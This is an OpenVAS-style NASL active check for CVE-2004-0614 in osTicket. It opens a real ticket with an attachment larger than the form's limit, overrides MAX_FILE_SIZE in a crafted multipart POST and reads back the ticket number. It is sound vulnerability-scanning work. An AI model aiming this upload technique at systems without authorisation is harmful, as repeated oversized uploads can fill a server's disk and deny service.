# SPDX-FileCopyrightText: 2005 George A. Theall
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:osticket:osticket";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.13646");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2004-0614");

  script_name("osTicket < 1.2.7 Large Attachment Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 George A. Theall");
  script_family("Web application abuses");
  script_dependencies("osticket_http_detect.nasl");
  script_mandatory_keys("osticket/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"The target is running at least one instance of osTicket that
  enables a remote user to an open new ticket with an attachment of unlimited size.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"An attacker could exploit this vulnerability and cause a denial
  of service (DoS) by filling up the filesystem used for attachments.");

  script_tag(name:"solution", value:"Update to version 1.2.7 or later.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

host = http_host_name( port:port );
hostnoport = http_host_name( dont_add_port:TRUE );

url = dir + "/open.php";
req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );
if( ! res )
  exit( 0 );

# If the form supports attachments...
if( egrep( pattern:'type="file" name="attachment"', string:res, icase:TRUE ) ) {
  #  Grab the session cookie.
  pat = "Set-Cookie: (.+); path=";
  matches = egrep( pattern:pat, string:res, icase:TRUE );
  foreach match( split( matches ) ) {
    match = chomp( match );
    cookie = eregmatch( pattern:pat, string:match );
    if( isnull( cookie ) )
      break;

    cookie = cookie[1];
  }

  #  Grab the max file size.
  pat = 'name="MAX_FILE_SIZE" value="(.+)"';
  matches = egrep( pattern:pat, string:res, icase:TRUE );
  foreach match( split( matches ) ) {
    match = chomp( match );
    max = eregmatch( pattern:pat, string:match );
    if( isnull( max ) )
      break;

    max = max[1];
  }

  # Open a ticket as long as we have a session cookie and a maximum file size.
  if( cookie && max ) {
    vt_strings = get_vt_strings();
    boundary = "bound";
    req = string("POST ",  url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Cookie: ", cookie, "\r\n",
                 "Content-Type: multipart/form-data; boundary=", boundary, "\r\n");
                 # nb: we'll add the Content-Length header and post data later.

    boundary = string("--", boundary);

    postdata = string(boundary, "\r\n",
                      'Content-Disposition: form-data; name="name"', "\r\n",
                      "\r\n",
                      vt_strings["lowercase"],
                      "\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="email"', "\r\n",
                      "\r\n",
                      "postmaster@", hostnoport, "\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="phone"', "\r\n",
                      "\r\n",
                      "\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="cat"', "\r\n",
                      "\r\n",
                      "4\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="subject"', "\r\n",
                      "\r\n",
                      "Attachment Upload Test\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="message"', "\r\n",
                      "\r\n",
                      "Attempt to open a ticket and attach an excessively large attachment.\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="pri"', "\r\n",
                      "\r\n",
                      "1\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="MAX_FILE_SIZE"', "\r\n",
                      "\r\n",
                      # NB: we will allow for double the preset max...
                      max*2, "\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="attachment"; filename="big_file"', "\r\n",
                      "Content-Type: application/octet-stream\r\n",
                      "\r\n",
                      # but only upload a file with an extra 10%.
                      crap(max*11/10), "\r\n",
                      boundary, "\r\n",
                      'Content-Disposition: form-data; name="submit_x"', "\r\n",
                      "\r\n",
                      "Open Ticket\r\n",
                      boundary, "--", "\r\n" );
    req = string(req, "Content-Length: ", strlen(postdata), "\r\n\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req);
    if( isnull( res ) )
      exit( 0 );

    # Grab the ticket number that was issued.
    pat = 'name="login_ticket" .+ value="(.+)">';
    if( matches = egrep( pattern:pat, string:res, icase:TRUE ) ) {
      foreach match( split( matches ) ) {
        match = chomp( match );
        ticket = eregmatch( pattern:pat, string:match );
        if( isnull( ticket ) )
          break;

        ticket = ticket[1];
      }

      if( ticket ) {
        desc = "The Scanner successfully opened ticket #" + ticket + " and uploaded\n" +
               "an attachment exceeding the maximum size as " + ticket + "_big_file to\n" +
               "osTicket's attachment directory. You are strongly encouraged to delete\n" +
               "this file as soon as possible to free up disk space.";
        security_message( port:port, data:desc );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
